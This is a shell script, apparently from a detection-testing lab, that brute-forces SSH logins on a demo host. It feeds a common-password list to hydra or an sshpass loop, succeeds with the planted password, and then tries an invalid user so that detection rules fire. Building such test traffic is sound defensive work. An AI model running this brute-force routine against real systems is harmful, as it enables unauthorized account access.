#!/bin/sh
# Brute-force the demo SSH account, then a couple of invalid users for variety.
# The real password is appended last so we also get a successful login — a
# realistic "compromise" that the TICKET-005 detection rules will flag.
set -eu

TARGET_HOST="${TARGET_HOST:-ssh-target}"
TARGET_USER="${TARGET_USER:-sentry}"
REAL_PASSWORD="${REAL_PASSWORD:-password123}"

echo "Waiting for ${TARGET_HOST}:22 ..."
i=0
while [ "$i" -lt 30 ]; do
  if nc -z "$TARGET_HOST" 22 2>/dev/null; then break; fi
  i=$((i + 1))
  sleep 1
done

PWFILE="$(mktemp)"
cat > "$PWFILE" <<EOF
123456
password
admin
root
letmein
qwerty
football
$REAL_PASSWORD
EOF

echo "=== Brute-forcing ${TARGET_USER}@${TARGET_HOST} ($(wc -l < "$PWFILE") passwords) ==="
if command -v hydra >/dev/null 2>&1; then
  # -f: stop after the first success; -t 4: 4 parallel tasks.
  hydra -l "$TARGET_USER" -P "$PWFILE" -t 4 -f "ssh://${TARGET_HOST}" || true
else
  echo "hydra unavailable; using sshpass fallback"
  while IFS= read -r pw; do
    if sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
        "${TARGET_USER}@${TARGET_HOST}" exit 2>/dev/null; then
      echo "SUCCESS with: $pw"
      break
    else
      echo "failed: $pw"
    fi
  done < "$PWFILE"
fi

echo "=== A few invalid-user attempts ==="
for pw in 123456 password admin; do
  sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
    "ghost@${TARGET_HOST}" exit 2>/dev/null || true
done

echo "=== Attack run complete ==="
